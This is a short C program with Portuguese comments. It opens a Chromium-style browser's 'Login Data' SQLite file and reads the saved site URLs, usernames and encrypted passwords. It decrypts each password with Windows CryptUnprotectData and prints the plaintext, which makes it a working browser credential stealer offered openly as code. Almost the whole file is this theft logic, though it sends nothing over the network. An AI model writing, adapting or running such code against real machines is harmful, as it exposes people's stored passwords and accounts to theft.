#include <stdio.h>
#include <windows.h>
#include <wincrypt.h>
#include "sqlite3.h"

int main() {


    //Abrir o banco: 

    sqlite3 *database;
    int ret;
    char *sql;
    sqlite3_stmt * stmt;

    ret = sqlite3_open("Login Data", &database);
    if (ret){
        //erro
        fprintf(stderr, "Erro ao abrir%s\n", sqlite3_errmsg(database));
        return 1;
    }
    else {
        fprintf(stderr, "Conexão Estabelecida\n\n");
    }


    // Preparando query
    sql = "SELECT id, origin_url, username_value, password_value FROM logins";
    ret = sqlite3_prepare_v2(database, sql, -1, &stmt, NULL);


    if (ret != SQLITE_OK) {

        fprintf(stderr, "Erro ao preparar a query %s\n", sqlite3_errmsg(database));
        sqlite3_close(database);
    }
    
    int n = 0;

    // Laço de repetição para consultar linha por linha até acabar.
    while ((ret = sqlite3_step(stmt)) == SQLITE_ROW) {
        n++;
        int id = sqlite3_column_int(stmt, 0);
        const unsigned char *url = sqlite3_column_text(stmt, 1);
        const unsigned char *user = sqlite3_column_text(stmt, 2);

        const void *crypted_pass = sqlite3_column_blob(stmt, 3);
        int len = sqlite3_column_bytes(stmt, 3);

        DATA_BLOB entrada;
            entrada.pbData = (BYTE *)crypted_pass; // Um ponteiro para uma estrutura DATA_BLOB que contém os dados criptografados. 
            entrada.cbData = len; // comprimento da string de bytes do pbData.

        DATA_BLOB saida;
            LPWSTR pDescrOut = NULL;

        if (CryptUnprotectData(
            &entrada,
            NULL,
            NULL,
            NULL,
            NULL,
            0,
            &saida
            )) {

                printf("Login Date: %i\nID: %d\nUser: %s\nURL: %s\nSenha: %ls\n\n", n, id, user, url, (LPWSTR)saida.pbData);
                LocalFree(saida.pbData);
            }
            else
            {

                printf("Erro ao descriptografar com CryptUnprotectData.\n");
                continue;
            }

    }


    printf("Varredura finalizada.\n");
    printf("Encerrando conexão...\n");
    sqlite3_finalize(stmt);
    sqlite3_close(database);


    return 0;
}
